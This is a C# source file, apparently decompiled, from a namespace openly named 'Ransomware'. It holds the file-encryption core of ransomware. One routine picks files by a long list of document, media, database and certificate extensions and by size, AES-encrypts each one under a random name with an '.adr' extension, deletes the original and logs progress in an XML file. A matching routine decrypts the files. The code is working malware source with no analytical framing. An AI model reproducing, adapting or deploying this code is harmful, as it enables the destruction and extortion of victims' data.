using System;
using System.Collections;
using System.IO;
using System.Text;
using System.Threading;
using System.Xml;

namespace Ransomware;

public class ransomwareCryptoMod
{
	public static string getRandomFileName()
	{
		string text = "";
		string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()";
		Random random = new Random();
		int num = random.Next(7, 13);
		while (num-- > 0)
		{
			text += text2[random.Next(text2.Length)];
		}
		return text;
	}

	public static bool encryptFile(string orgFile, byte[] aesKey, string size)
	{
		try
		{
			string text = ".png .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw .as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp .cr2 .crt .crw .db .dbf .dcr .der .dng .doc .docb .docm .docx .dot .dotm .dotx .dwg .dxf .dxg .efx .eps .erf .fla .flv .idml .iff .indb .indd .indl .indt .inx .jar .java .jpeg .jpg .kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mp3 .mp4 .mpa .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt .orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot .potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel .prproj .ps .psd .pst .ptx .r3d .ra .raf .rar .raw .rb .rtf .rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif .vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk .xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx .zip";
			string text2 = new FileInfo(orgFile).DirectoryName + "\\";
			string name = new FileInfo(orgFile).Name;
			string text3 = new FileInfo(orgFile).Extension.ToLower();
			if (!text.Contains(text3) || text3 == "")
			{
				return false;
			}
			long length = new FileInfo(orgFile).Length;
			switch (size)
			{
			case "normal":
				if (length >= 50000000L || length <= 5000L)
				{
					return false;
				}
				break;
			case "small":
				if (length >= 5000L)
				{
					return false;
				}
				break;
			case "big":
				if (length < 50000000L)
				{
					return false;
				}
				break;
			}
			byte[] array = File.ReadAllBytes(orgFile);
			byte[] bytes = Encoding.UTF8.GetBytes(name);
			if (bytes.Length > 255)
			{
				return false;
			}
			Array.Resize(ref array, array.Length + 256);
			Array.ConstrainedCopy(bytes, 0, array, array.Length - 256, bytes.Length);
			File.WriteAllBytes(text2 + getRandomFileName() + ".adr", AES.encrypt(array, aesKey));
			File.Delete(orgFile);
			if (encryptInfo.allFileNumber >= 97L)
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(encryptInfo.infoPath);
				encryptInfo.allFileNumber += long.Parse(readXml(xmlDocument, "AllFileNumber"));
				writeXml(xmlDocument, "AllFileNumber", encryptInfo.allFileNumber.ToString());
				encryptInfo.allFileNumber = 0L;
				encryptInfo.allFileSize += long.Parse(readXml(xmlDocument, "AllFileSize"));
				writeXml(xmlDocument, "AllFileSize", encryptInfo.allFileSize.ToString());
				encryptInfo.allFileSize = 0L;
				DateTime now = DateTime.Now;
				double totalSeconds = (now - encryptInfo.StartTime).TotalSeconds;
				writeXml(xmlDocument, "RunTime", (totalSeconds + double.Parse(readXml(xmlDocument, "RunTime"))).ToString());
				encryptInfo.StartTime = DateTime.Now;
			}
			encryptInfo.allFileNumber++;
			encryptInfo.allFileSize += length;
			Thread.Sleep(30);
			return true;
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static string readXml(XmlDocument doc, string name)
	{
		string result = "unknow";
		XmlNodeList childNodes = doc.SelectSingleNode("Users")!.ChildNodes;
		IEnumerator enumerator = childNodes.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				XmlNode xmlNode = (XmlNode)enumerator.Current;
				XmlElement xmlElement = (XmlElement)xmlNode;
				XmlNodeList childNodes2 = xmlElement.ChildNodes;
				foreach (XmlNode item in childNodes2)
				{
					XmlElement xmlElement2 = (XmlElement)item;
					if (xmlElement2.Name == name)
					{
						result = xmlElement2.InnerText;
						break;
					}
				}
			}
		}
		finally
		{
			IDisposable disposable = enumerator as IDisposable;
			if (disposable != null)
			{
				disposable.Dispose();
			}
		}
		doc.Save(encryptInfo.infoPath);
		return result;
	}

	public static string writeXml(XmlDocument doc, string name, string value)
	{
		string result = "unknow";
		XmlNodeList childNodes = doc.SelectSingleNode("Users")!.ChildNodes;
		IEnumerator enumerator = childNodes.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				XmlNode xmlNode = (XmlNode)enumerator.Current;
				XmlElement xmlElement = (XmlElement)xmlNode;
				XmlNodeList childNodes2 = xmlElement.ChildNodes;
				foreach (XmlNode item in childNodes2)
				{
					XmlElement xmlElement2 = (XmlElement)item;
					if (xmlElement2.Name == name)
					{
						xmlElement2.InnerText = value;
						result = xmlElement2.InnerText;
						break;
					}
				}
			}
		}
		finally
		{
			IDisposable disposable = enumerator as IDisposable;
			if (disposable != null)
			{
				disposable.Dispose();
			}
		}
		doc.Save(encryptInfo.infoPath);
		return result;
	}

	public static bool decryptFile(string orgFile, byte[] aesKey)
	{
		try
		{
			string text = new FileInfo(orgFile).DirectoryName + "\\";
			string extension = new FileInfo(orgFile).Extension;
			_ = new FileInfo(orgFile).Name.Split(new char[1] { '.' })[0];
			if (extension != ".adr")
			{
				return false;
			}
			byte[] byte_ciphertext = File.ReadAllBytes(orgFile);
			byte_ciphertext = AES.decrypt(byte_ciphertext, aesKey);
			byte[] array = new byte[256];
			Array.ConstrainedCopy(byte_ciphertext, byte_ciphertext.Length - 256, array, 0, 256);
			string @string = Encoding.UTF8.GetString(array);
			@string = @string.TrimEnd(new char[1]);
			Array.Resize(ref byte_ciphertext, byte_ciphertext.Length - 256);
			File.WriteAllBytes(text + @string, byte_ciphertext);
			File.Delete(orgFile);
			return true;
		}
		catch (Exception)
		{
		}
		return false;
	}
}
